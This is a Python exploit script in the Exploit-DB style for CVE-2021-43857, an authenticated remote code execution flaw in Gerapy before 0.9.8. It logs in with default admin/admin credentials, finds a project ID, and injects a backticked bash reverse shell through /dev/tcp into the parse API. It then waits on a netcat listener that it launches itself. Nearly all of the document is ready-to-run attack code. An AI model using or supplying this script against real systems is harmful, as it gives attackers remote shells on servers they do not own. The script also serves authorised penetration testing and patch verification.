# Exploit Title: Gerapy 0.9.7 - Remote Code Execution (RCE) (Authenticated)
# Date: 03/01/2022
# Exploit Author: Jeremiasz Pluta
# Vendor Homepage: https://github.com/Gerapy/Gerapy
# Version: All versions of Gerapy prior to 0.9.8
# CVE: CVE-2021-43857
# Tested on: Gerapy 0.9.6
# Terribledactyl added some error handling in 2024

# Vulnerability: Gerapy prior to version 0.9.8 is vulnerable to remote code execution. This issue is patched in version 0.9.8.
#!/usr/bin/python
import sys
import re
import argparse
import pyfiglet
import requests
import time
import json
import subprocess

banner = pyfiglet.figlet_format("CVE-2021-43857")
print(banner)
print('Exploit for CVE-2021-43857')
print('For: Gerapy < 0.9.8')

login = "admin"  # CHANGE ME IF NEEDED
password = "admin"  # CHANGE ME IF NEEDED

class Exploit:
    def __init__(self, target_ip, target_port, localhost, localport):
        self.target_ip = target_ip
        self.target_port = target_port
        self.localhost = localhost
        self.localport = localport

    def exploitation(self):
        payload = f"""{{"spider":"`/bin/bash -c 'bash -i >& /dev/tcp/{self.localhost}/{self.localport} 0>&1'`"}}"""

        # Login to the app (getting auth token)
        url = f"http://{self.target_ip}:{self.target_port}"
        r = requests.Session()

        print("[*] Resolving URL...")
        r1 = r.get(url)
        time.sleep(3)

        print("[*] Logging in to application...")
        r2 = r.post(url + "/api/user/auth", json={"username": login, "password": password}, allow_redirects=True)
        time.sleep(3)

        if r2.status_code == 200:
            print('[*] Login successful! Proceeding...')
        else:
            print('[!] Login failed! Check credentials or target availability.')
            quit()

        # Create a header from the auth token
        try:
            auth_data = json.loads(r2.text)
            auth_token = {'Authorization': 'Token ' + auth_data['token']}
        except (KeyError, json.JSONDecodeError) as e:
            print(f"[!] Failed to retrieve auth token: {e}")
            quit()

        # Get the project list
        print("[*] Getting the project list")
        r3 = r.get(url + "/api/project/index", headers=auth_token, allow_redirects=True)
        time.sleep(3)

        if r3.status_code != 200:
            print("[!] Failed to fetch projects. Status code:", r3.status_code)
            quit()

        try:
            project_list = json.loads(r3.text)

            if not project_list:
                print("[!] No projects found - try making one in the web console!")
                quit()

            name = project_list[0]['name']
            print("[*] Found project:", name)

        except (IndexError, KeyError, json.JSONDecodeError) as e:
            print(f"[!] Error parsing project list: {e}")
            quit()

        # Get the project ID
        print("[*] Getting the ID of the project to build the URL")
        r4 = r.get(url + f"/api/project/{name}/build", headers=auth_token, allow_redirects=True)
        time.sleep(3)

        if r4.status_code != 200:
            print("[!] Cannot reach the project! Status code:", r4.status_code)
            quit()

        try:
            project_data = json.loads(r4.text)
            project_id = project_data['id']
            print("[*] Found ID of the project:", project_id)

        except (KeyError, json.JSONDecodeError) as e:
            print(f"[!] Error parsing project ID: {e}")
            quit()

        # Set up a netcat listener
        print("[*] Setting up a netcat listener")
        listener = subprocess.Popen(["nc", "-nvlp", self.localport])
        time.sleep(3)

        # Execute the payload
        print("[*] Executing reverse shell payload")
        r5 = r.post(url + f"/api/project/{project_id}/parse", data=payload, headers=auth_token, allow_redirects=True)

        if r5.status_code == 200:
            print("[*] Exploit executed successfully! Waiting for shell...")
            listener.wait()
        else:
            print("[!] Exploit failed! Status code:", r5.status_code)
            listener.terminate()

def get_args():
    parser = argparse.ArgumentParser(description='Gerapy < 0.9.8 Remote Code Execution (Authenticated)')
    parser.add_argument('-t', '--target', dest="url", required=True, action='store', help='Target IP')
    parser.add_argument('-p', '--port', dest="target_port", required=True, action='store', help='Target port')
    parser.add_argument('-L', '--lh', dest="localhost", required=True, action='store', help='Listening IP')
    parser.add_argument('-P', '--lp', dest="localport", required=True, action='store', help='Listening port')
    args = parser.parse_args()
    return args

args = get_args()
target_ip = args.url
target_port = args.target_port
localhost = args.localhost
localport = args.localport

exp = Exploit(target_ip, target_port, localhost, localport)
exp.exploitation()
